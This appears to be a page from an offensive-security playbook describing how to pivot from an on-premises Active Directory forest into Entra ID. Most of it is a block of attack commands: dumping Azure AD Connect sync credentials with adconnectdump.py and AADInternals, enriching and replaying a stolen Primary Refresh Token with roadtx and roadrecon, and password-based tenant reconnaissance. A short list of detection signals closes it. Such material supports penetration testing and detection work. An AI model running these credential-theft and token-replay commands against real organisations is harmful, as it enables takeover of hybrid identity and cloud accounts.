---
id: hybrid
type: phase
label: "Cross-Forest / Hybrid / Cloud Pivot"
---


# Cross-Forest / Hybrid / Cloud Pivot

### Objective
On-prem ↔ Entra ID pivot.

### Attack surface
**Azure AD Connect** (connector account with replication rights), **PRT theft**, **seamless SSO**, **passkey replay**, **token replay to Graph**.

### Exhaustive commands
```bash
# ── AAD Connect credential extraction ────────────────────────────────
python3 adconnectdump.py corp.local/admin:'Password123!'@10.10.10.5
Import-Module AADInternals
Get-AADIntSyncCredentials

# ── PRT enrichment and replay ─────────────────────────────────────────
roadtx prtenrich -c prt.json -r refresh_token.json
roadrecon auth --prt prt.json
roadrecon gather

# ── Azure recon ───────────────────────────────────────────────────────
roadrecon auth -u admin@corp.onmicrosoft.com -p 'Password123!'
roadrecon gather
```

### Detection
Entra sign-in from atypical ASN, PRT issuance anomalies, AAD Connect service account logons.

---
